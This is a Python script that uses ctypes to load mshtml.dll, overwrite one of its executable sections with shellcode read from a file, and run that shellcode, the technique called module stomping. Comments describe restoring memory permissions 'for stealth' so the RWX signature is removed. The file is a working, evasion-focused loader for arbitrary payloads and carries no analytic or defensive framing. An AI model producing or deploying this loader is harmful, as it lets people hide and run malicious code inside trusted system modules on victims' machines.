import sys
import ctypes
from ctypes import wintypes

# --- PE Header Structures for 64-bit ---
# These structures are necessary to parse the DLL in memory to find an executable section.

class IMAGE_DOS_HEADER(ctypes.Structure):
    _fields_ = [
        ('e_magic', wintypes.WORD), ('e_cblp', wintypes.WORD), ('e_cp', wintypes.WORD),
        ('e_crlc', wintypes.WORD), ('e_cparhdr', wintypes.WORD), ('e_minalloc', wintypes.WORD),
        ('e_maxalloc', wintypes.WORD), ('e_ss', wintypes.WORD), ('e_sp', wintypes.WORD),
        ('e_csum', wintypes.WORD), ('e_ip', wintypes.WORD), ('e_cs', wintypes.WORD),
        ('e_lfarlc', wintypes.WORD), ('e_ovno', wintypes.WORD), ('e_res', wintypes.WORD * 4),
        ('e_oemid', wintypes.WORD), ('e_oeminfo', wintypes.WORD), ('e_res2', wintypes.WORD * 10),
        ('e_lfanew', wintypes.LONG),
    ]

class IMAGE_FILE_HEADER(ctypes.Structure):
    _fields_ = [
        ('Machine', wintypes.WORD), ('NumberOfSections', wintypes.WORD),
        ('TimeDateStamp', wintypes.DWORD), ('PointerToSymbolTable', wintypes.DWORD),
        ('NumberOfSymbols', wintypes.DWORD), ('SizeOfOptionalHeader', wintypes.WORD),
        ('Characteristics', wintypes.WORD),
    ]

class IMAGE_DATA_DIRECTORY(ctypes.Structure):
    _fields_ = [
        ('VirtualAddress', wintypes.DWORD), ('Size', wintypes.DWORD),
    ]

class IMAGE_OPTIONAL_HEADER64(ctypes.Structure):
    _fields_ = [
        ('Magic', wintypes.WORD), ('MajorLinkerVersion', ctypes.c_ubyte),
        ('MinorLinkerVersion', ctypes.c_ubyte), ('SizeOfCode', wintypes.DWORD),
        ('SizeOfInitializedData', wintypes.DWORD), ('SizeOfUninitializedData', wintypes.DWORD),
        ('AddressOfEntryPoint', wintypes.DWORD), ('BaseOfCode', wintypes.DWORD),
        ('ImageBase', ctypes.c_ulonglong), ('SectionAlignment', wintypes.DWORD),
        ('FileAlignment', wintypes.DWORD), ('MajorOperatingSystemVersion', wintypes.WORD),
        ('MinorOperatingSystemVersion', wintypes.WORD), ('MajorImageVersion', wintypes.WORD),
        ('MinorImageVersion', wintypes.WORD), ('MajorSubsystemVersion', wintypes.WORD),
        ('MinorSubsystemVersion', wintypes.WORD), ('Win32VersionValue', wintypes.DWORD),
        ('SizeOfImage', wintypes.DWORD), ('SizeOfHeaders', wintypes.DWORD),
        ('CheckSum', wintypes.DWORD), ('Subsystem', wintypes.WORD),
        ('DllCharacteristics', wintypes.WORD), ('SizeOfStackReserve', ctypes.c_ulonglong),
        ('SizeOfStackCommit', ctypes.c_ulonglong), ('SizeOfHeapReserve', ctypes.c_ulonglong),
        ('SizeOfHeapCommit', ctypes.c_ulonglong), ('LoaderFlags', wintypes.DWORD),
        ('NumberOfRvaAndSizes', wintypes.DWORD),
        ('DataDirectory', IMAGE_DATA_DIRECTORY * 16),
    ]

class IMAGE_NT_HEADERS64(ctypes.Structure):
    _fields_ = [
        ('Signature', wintypes.DWORD),
        ('FileHeader', IMAGE_FILE_HEADER),
        ('OptionalHeader', IMAGE_OPTIONAL_HEADER64),
    ]

class IMAGE_SECTION_HEADER(ctypes.Structure):
    _fields_ = [
        ('Name', ctypes.c_char * 8),
        ('Misc_VirtualSize', wintypes.DWORD),
        ('VirtualAddress', wintypes.DWORD),
        ('SizeOfRawData', wintypes.DWORD),
        ('PointerToRawData', wintypes.DWORD),
        ('PointerToRelocations', wintypes.DWORD),
        ('PointerToLinenumbers', wintypes.DWORD),
        ('NumberOfRelocations', wintypes.WORD),
        ('NumberOfLinenumbers', wintypes.WORD),
        ('Characteristics', wintypes.DWORD),
    ]

# --- Windows API Definitions and Constants ---

# Extend wintypes for 64-bit compatibility to prevent pointer truncation errors.
wintypes.SIZE_T = ctypes.c_size_t
wintypes.LPDWORD = ctypes.POINTER(wintypes.DWORD)
wintypes.LPVOID = ctypes.c_void_p
wintypes.LPCWSTR = ctypes.c_wchar_p
wintypes.HMODULE = ctypes.c_void_p

# Windows API setup with explicit argtypes and restype for 64-bit correctness.
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)

VirtualProtect = kernel32.VirtualProtect
VirtualProtect.argtypes = [wintypes.LPVOID, wintypes.SIZE_T, wintypes.DWORD, wintypes.LPDWORD]
VirtualProtect.restype = wintypes.BOOL

LoadLibraryW = kernel32.LoadLibraryW
LoadLibraryW.argtypes = [wintypes.LPCWSTR]
LoadLibraryW.restype = wintypes.HMODULE

# Constants for memory permissions and section characteristics
PAGE_EXECUTE_READWRITE = 0x40
PAGE_EXECUTE_READ = 0x20
IMAGE_SCN_MEM_EXECUTE = 0x20000000

def main():
    if len(sys.argv) < 2:
        sys.exit(1)

    try:
        with open(sys.argv[1], 'rb') as f:
            shellcode = f.read()
    except FileNotFoundError:
        sys.exit(2)

    shellcode_len = len(shellcode)
    if shellcode_len == 0:
        sys.exit(3)
        
    # 1. Load a legitimate, large DLL into the process.
    # mshtml.dll is a good target as it's common and has large executable sections.
    dll_name = "mshtml.dll"
    h_module = LoadLibraryW(dll_name)
    if not h_module:
        sys.exit(4)

    base_address = ctypes.c_void_p(h_module)

    # 2. Parse the DLL's PE header in memory to find a suitable section.
    dos_header = ctypes.cast(base_address, ctypes.POINTER(IMAGE_DOS_HEADER)).contents
    nt_headers_ptr = ctypes.c_void_p(base_address.value + dos_header.e_lfanew)
    nt_headers = ctypes.cast(nt_headers_ptr, ctypes.POINTER(IMAGE_NT_HEADERS64)).contents

    # Calculate the start of the section table.
    section_header_ptr_val = nt_headers_ptr.value + ctypes.sizeof(IMAGE_NT_HEADERS64)

    target_section = None
    
    # Iterate through sections to find one that is executable and large enough.
    for i in range(nt_headers.FileHeader.NumberOfSections):
        section_header_ptr = ctypes.c_void_p(section_header_ptr_val + i * ctypes.sizeof(IMAGE_SECTION_HEADER))
        section_header = ctypes.cast(section_header_ptr, ctypes.POINTER(IMAGE_SECTION_HEADER)).contents
        
        if (section_header.Characteristics & IMAGE_SCN_MEM_EXECUTE) and (section_header.Misc_VirtualSize >= shellcode_len):
            target_section = section_header
            break
            
    if not target_section:
        sys.exit(5)

    # 3. Calculate the absolute memory address of the target section.
    section_address = ctypes.c_void_p(base_address.value + target_section.VirtualAddress)

    # 4. Change memory permissions to RWX to allow writing the shellcode.
    old_protect = wintypes.DWORD(0)
    if not VirtualProtect(section_address, shellcode_len, PAGE_EXECUTE_READWRITE, ctypes.byref(old_protect)):
        sys.exit(6)

    # 5. Copy the shellcode into the hijacked section.
    ctypes.memmove(section_address, shellcode, shellcode_len)

    # 6. Revert memory permissions to RX for stealth. This removes the RWX signature.
    if not VirtualProtect(section_address, shellcode_len, PAGE_EXECUTE_READ, ctypes.byref(old_protect)):
        sys.exit(7)

    # 7. Create a function pointer to the shellcode and execute it.
    shellcode_func = ctypes.CFUNCTYPE(None)(section_address.value)
    shellcode_func()
    
    return 0

if __name__ == "__main__":
    main()